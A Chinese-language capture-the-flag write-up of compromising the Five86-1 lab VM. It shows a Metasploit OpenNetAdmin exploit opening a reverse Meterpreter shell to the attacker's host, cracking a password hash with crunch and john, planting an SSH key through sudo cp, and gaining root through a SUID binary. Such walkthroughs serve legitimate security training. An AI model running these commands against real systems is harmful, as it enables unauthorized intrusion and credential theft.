# Five86-1 靶机实践

## 0x01 渗透实践

nmap扫一下开了22和80，

80界面是个OpenNetAdmin

翻下Exploit-db,刚好有对应版本的metasploit exp,下载下来搞一搞

```shell
msfdb init
msfconsole
msf5 > use exploit/47772
msf5 exploit(47772) > set rhost 192.168.31.179
rhost => 192.168.31.179
msf5 exploit(47772) > set lhost 192.168.31.51
lhost => 192.168.31.51
msf5 exploit(47772) > exploit

[*] Started reverse TCP handler on 192.168.31.51:4444
[*] Exploiting...
[*] Sending stage (985320 bytes) to 192.168.31.179
[*] Meterpreter session 1 opened (192.168.31.51:4444 -> 192.168.31.179:59022) at 2020-02-27 21:29:15 +0800
[*] Command Stager progress - 100.14% done (706/705 bytes)

meterpreter >
```

接下来就是慢慢看突破点了

home下目录进不去

找到``/var/www``下有``.htpasswd``

大概就是用来保存一个用户，网站只能得到该用户的权限

```shell
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1

# To make things slightly less painful (a standard dictionary will likely fail),
# use the following character set for this 10 character password: aefhrt
```

还贴心了给了提示，方便你构造爆破字典。。。

```shell
root@kali:~/five86# crunch 10 10 aefhrt > dic.txt
Crunch will now generate the following amount of data: 665127936 bytes
634 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 60466176

root@kali:~/five86#
root@kali:~/five86# echo 'douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' > hash
root@kali:~/five86# john --wordlist=/root/five86/dic.txt hash
```

爆破拿到``fatherrrrr       (douglas)``

```
meterpreter > shell
Process 2331 created.
Channel 4 created.
python -c "import pty;pty.spawn('/bin/bash')"
www-data@five86-1:~$ su douglas
su douglas
Password: fatherrrrr

douglas@five86-1:/var/www$
```

``sudo -l``看一下

```
douglas@five86-1:~$ sudo -l
sudo -l
Matching Defaults entries for douglas on five86-1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User douglas may run the following commands on five86-1:
    (jen) NOPASSWD: /bin/cp
```

那么我们可以利用jen的权限往他目录下的./ssh添加我们的authorized_keys，就能连接到他的账号了

```shell
cat id_rsa.pub > /tmp/authorized_keys
cd /tmp
chmod 777 authorized_keys
sudo -u jen /bin/cp authorized_keys /home/jen/.ssh
```

```shell
cd .ssh
cp id_rsa /tmp
cd /tmp
chmod 600 id_rsa
ssh -i id_rsa jen@localhost
```

注意id_rsa的文件权限要设置为600,不然会提示

```
Permissions 0777 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
```

登上去``sudo -l``发现需要密码

其实登陆时有个提示是

``You have new mail.``

去读下邮件

找到

```
But anyway, I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!
```

现在我们可以登陆Moss的账号了

``sudo -l``无果，

看下SUID

```
moss@five86-1:/var/mail$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/exim4
/home/moss/.games/upyourgame
```

最后一个很有意思

```
moss@five86-1:/var/mail$ /home/moss/.games/upyourgame
/home/moss/.games/upyourgame
Would you like to play a game? yes
yes

Could you please repeat that? yes
yes

Nope, you'll need to enter that again. yes
yes

You entered: No.  Is this correct? no
no

We appear to have a problem?  Do we have a problem? no
no

Made in Britain.
# id
id
uid=0(root) gid=1001(moss) groups=1001(moss)
```

看到``#``试了一下，发现莫名其妙的就已经拿到了root权限。。。。

